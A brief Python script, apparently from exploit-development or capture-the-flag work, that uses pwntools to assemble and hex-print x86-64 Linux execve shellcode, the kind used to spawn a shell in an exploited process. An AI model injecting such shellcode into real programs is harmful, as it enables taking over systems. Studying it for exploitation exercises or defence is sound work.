#!/usr/bin/env python3

from pwnlib.util.packing import u64
from pwnlib.asm import asm
from pwnlib.context import context
import binascii

context.os = 'linux'  # pylint: disable=assigning-non-slot
context.arch = 'amd64'  # pylint: disable=assigning-non-slot

asm_code = ""
asm_code += 'mov rdi, rsp\n'
asm_code += 'mov rsi, 0\n'
asm_code += f'mov rdx, 0\n'
asm_code += 'mov rax, 59\n'
asm_code += 'syscall\n'

print(binascii.hexlify(asm(asm_code)))
